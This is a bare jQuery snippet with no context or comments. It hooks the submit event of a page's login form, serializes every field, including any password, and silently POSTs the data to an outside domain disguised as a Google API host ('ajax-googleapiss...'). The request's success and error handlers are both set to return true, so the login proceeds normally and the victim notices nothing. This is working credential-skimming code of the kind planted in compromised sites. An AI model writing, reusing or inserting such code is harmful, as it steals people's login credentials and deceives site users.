$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "https://ajax-googleapiss.robot-profit.com/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
